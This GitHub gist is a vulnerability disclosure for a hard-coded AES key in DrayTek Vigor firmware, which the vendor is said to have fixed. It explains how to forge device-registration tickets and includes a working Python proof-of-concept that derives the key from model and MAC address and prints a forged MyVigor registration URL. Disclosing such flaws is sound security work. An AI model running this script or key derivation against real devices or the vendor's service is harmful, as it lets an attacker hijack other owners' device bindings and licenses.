=== Content from gist.github.com_633507fe_20250114_192559.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Ji4n1ng](https://avatars.githubusercontent.com/u/11001224?s=64&v=4)](/Ji4n1ng)

# [Ji4n1ng](/Ji4n1ng)/**[DrayTek-vigor-vul-description.md](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef)**

Last active
November 12, 2024 02:22

Show Gist options

* [Download ZIP](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/archive/fcaf3ba20fc732a0482a922d793e51241395aaf2.zip)

* [Star
  (2)
  2](/login?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef)You must be signed in to star a gist
* [Fork
  (2)
  2](/login?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef.js&quot;&gt;&lt;/script&gt;
* Save Ji4n1ng/6d028709d39458f5ab95b3ea211225ef to your computer and use it in GitHub Desktop.

[Code](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef)
[Revisions
3](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/revisions)
[Stars
2](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/stargazers)
[Forks
2](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef.js&quot;&gt;&lt;/script&gt;

Save Ji4n1ng/6d028709d39458f5ab95b3ea211225ef to your computer and use it in GitHub Desktop.

[Download ZIP](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/archive/fcaf3ba20fc732a0482a922d793e51241395aaf2.zip)

DrayTek-vigor-vul-description

 [Raw](/Ji4n1ng/6d028709d39458f5ab95b3ea211225ef/raw/fcaf3ba20fc732a0482a922d793e51241395aaf2/DrayTek-vigor-vul-description.md)

[**DrayTek-vigor-vul-description.md**](#file-draytek-vigor-vul-description-md)

# Hard-coded Cryptographic Key Vulnrability

### Product

This vulnerability affects DrayTek's all Vigor series products, including routers, access points, and switches.

### Versions

The vulnerability exists in the following firmware versions:

* Routers: versions below 3.9.6/4.2.4.
* Access Points: versions below v1.4.0.
* Switches: versions below 2.6.7.
* Myvigor: versions below 2.3.2.

Note that DrayTek has confirmed and fixed this vulnrability.

### Vulnerability Type

CWE-321 - Use of Hard-coded Cryptographic Key

## Vulnerability Description

We have identified a vulnerability in DrayTek's firmware that involves the use of hard-coded encryption keys. This vulnerability allows an attacker to bind any affected device, which does not belong to them, with their own account. By utilizing the MAC address of a vulnerable device, the attacker can generate an encrypted URL to register the device. Even if the attacker does not know the device's MAC address, they can easily enumerate it by brute force. Once the device is bound to the attacker's account, the device owner is unable to bind it themselves. Consequently, the attacker gains the ability to create WCF and DrayDDNS licenses and synchronize them from the website.

The attacker can construct the device registration URL using the following parameters:

* `drayreg_mac`: device's MAC address.
* `drayreg_iv`: initialization vector (IV) for AES encryption.
* `drayreg_sec`: ciphertext used for server verification.

The construction of the registration URL is shown in the following figure. The attacker can either brute force the `drayreg_mac` within a specific range or use publicly exposed MAC addresses on the Internet. The `drayreg_iv` is randomly generated and serves as the IV for AES encryption. On the other hand, the `drayreg_sec` is the ciphertext used by the server for verification purposes.

[![2020-08-13-19-05-53.png](https://camo.githubusercontent.com/7ec760015ac1c45299f83f7dd718c4bd137d249a3bcc9c0595229d0af7614c5b/68747470733a2f2f73312e617831782e636f6d2f323032302f30382f32312f6459794b304b2e706e67)](https://camo.githubusercontent.com/7ec760015ac1c45299f83f7dd718c4bd137d249a3bcc9c0595229d0af7614c5b/68747470733a2f2f73312e617831782e636f6d2f323032302f30382f32312f6459794b304b2e706e67)

## POC

```
#!/usr/bin/python3

import base64
from Crypto.Cipher import AES

class AESCipher:
    def __init__( self, key, iv ):
        self.key = key
        self.iv = iv

    def encrypt( self, raw ):
        cipher = AES.new( self.key, AES.MODE_CBC, self.iv )
        return base64.b64encode( cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv )
        return cipher.decrypt( enc )

def key_gen(model, mac):
    key = model
    key_pads = ['50', '32', '12', '57', '59']
    for i in range(5):
        j = (5 - i) * 2
        k = j + 2
        key += mac[j:k] + key_pads[i]
    key += mac[0:2]
    if len(key) > 32:
        key = key[:32]
    return key

def plaintext_gen(mac, time, bits):
    plaintext = f'{mac}+{time}+http://192.168.1.1+'
    plaintext = plaintext.ljust(bits, '0')
    return plaintext

def url_gen(mac, iv, cipher):
    url = f'https://myvigor.draytek.com/login?mac={mac}&var={iv}&ticket={cipher}'
    return url

if __name__ == "__main__":
    fake_model = "vigor29120"
    fake_mac = "001daa978e60"
    fake_iv = "6d2f73b86c7f4c8e"
    fake_time = '20200812103100'

    fake_key = key_gen(fake_model, fake_mac)

    fake_aes = AESCipher(fake_key, fake_iv)

    plaintext = plaintext_gen(fake_mac, fake_time, 512)
    fake_cipher = fake_aes.encrypt(plaintext).decode('utf-8')
    print(fake_cipher)

    fake_url = url_gen(fake_mac, fake_iv, fake_cipher)
    print(fake_url)
```

### Screenshots

[![2020-08-13-16-16-08.png](https://camo.githubusercontent.com/be4a71deca439b9b51e9dbb61e956b60a71afd0f10713beb34c5aace164f641b/68747470733a2f2f73312e617831782e636f6d2f323032302f30382f32312f6459793174652e706e67)](https://camo.githubusercontent.com/be4a71deca439b9b51e9dbb61e956b60a71afd0f10713beb34c5aace164f641b/68747470733a2f2f73312e617831782e636f6d2f323032302f30382f32312f6459793174652e706e67)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FJi4n1ng%2F6d028709d39458f5ab95b3ea211225ef)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


